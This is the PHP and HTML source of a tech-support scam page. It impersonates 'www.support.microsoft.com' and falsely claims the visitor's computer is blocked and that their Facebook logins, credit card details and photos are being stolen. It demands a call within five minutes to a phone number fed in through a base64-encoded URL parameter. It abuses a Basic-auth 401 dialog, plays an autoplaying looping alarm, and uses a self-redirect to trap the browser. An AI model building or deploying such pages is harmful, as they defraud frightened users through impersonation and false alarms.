<?php
$number = isset($_GET['pn']) ? base64_decode($_GET['pn']) : '';
header('WWW-Authenticate: Basic realm="Internet Security Damaged !!! User Access Suspended !!  Call Microsoft Help Desk: '.$number.'(TOLL-FREE) for Free Checkup"'); 
header("HTTP/1.1 401 Unauthorized"); 
?>
<html>
<head>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-114131359-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-114131359-1');
</script>

</head>
<body style="background-color:#8c101f;"  >
<div style="z-index:2000; width:100%; height:460px; position: absolute; top:0px; margin:auto;">
<div style="min-height:456px; width:380px; background-color:#fbfbfb; border:1px solid #cdcdcd; border-radius:3px; top:0px; margin-left:33.8%; padding:30px; font-family:Verdana, Geneva, sans-serif; font-size:12px; position:fixed; z-index:2000; ">
<div style="width:100%; min-height:440px; ">
www.support.microsoft.com says :<br/>
<br/>
<p>** YOUR COMPUTER HAS BEEN BLOCKED **</p><br/>
<p>Error # 268D3<br/><br/>
Please call us immediately at: ' <?php echo $number; ?> ' <br/>
Do not ignore this critical alert.<br/>
 If you close this page, your computer access will be disabled to prevent further damage to our network.<br/><br/>
 Your computer has alerted us that it has been infected with a virus and spyware. The following information is being stolen...<br/><br/>
 >Facebook Login<br/>
 >Credit Card Details<br/>
 >Email Account Login<br/>
 >Photos stored on this computer<br/>
 You must contact us immediately so that our engineers can walk you through the removal process over the phone. Please call us within the next 5 minutes to prevent your computer from being disabled.<br/><br/>
 <strong style="font-size:22px"> Toll Free:  <?php echo $number; ?>  </strong></p>
 <input name="" type="checkbox" value="" />Prevent this page from creating additional dialogs
 </div>
 <br/>
 <div style="float:right; height:29px; width:71px; font-size:14px; font-weight:500px; text-align:center; line-height:30px;  border:1px solid #cdcdcd; border-radius:3px;">OK</div>
</div>
</div>
<audio autoplay loop>
  <source src="alert.mp3" type="audio/mpeg">
</audio>
<div style="margin:auto; width:90%;">
<div style="height:510px;width:85%;font-family:arial;padding:20px 20px 15px 20px;color:rgb(50,50,50);background:#f6f6f6;font-size:16px;line-height:17px; margin:auto;border-radius: 8px; box-shadow: 2px 2px 1px #888888;">
<table><tr><td width="126" valign="top"><img src="esclamitory.png" width="104" height="83" /></td><td width="952">
<p style="font-weight:800; font-size:24px; line-height:26px; font-family: Arial, Helvetica, sans-serif; margin:0px;">**YOUR WINDOWS HAS BEEN BLOCKED** &nbsp;&nbsp;&nbsp; ERROR # 268D3</P>
<br/>
<Br/>
Please call Microsoft Support immediately at: <?php echo $number; ?><br>
Do not ignore this critical alert.<br>
If you close this page, you network access will be disabled to prevent further damage to our network. <br><br>
Your computer has alerted us that it has been infected with some virus and spyware. The following information has been stolen...<br><br>
1) Facebook Login<br>
2) Credit Card Details<br>
3) Email Account Login<br>
4) Photos stored on this computer<br><br>
You must contact us immediately so that our engineers can walk you through the removal process over the phone. Please call us within the next 5 minutes to prevent your computer from being disabled.
<hr style="margin:10px -20px 0 -20px;height:0.01em"><p style="float:right">
<p style="font-weight:800; font-size:25px; text-align:center;">Please call Microsoft Support immediately at: <br/><?php echo $number; ?></P>
<p/>
<img src="alert.png" width="270" height="40" style="float:right; ">

</td></tr></table>
</div>
</div>

</body>
</html>
<?php
echo '<script type="text/javascript">window.location="indexx.php?pn='.base64_encode($number).'";</script>';
?>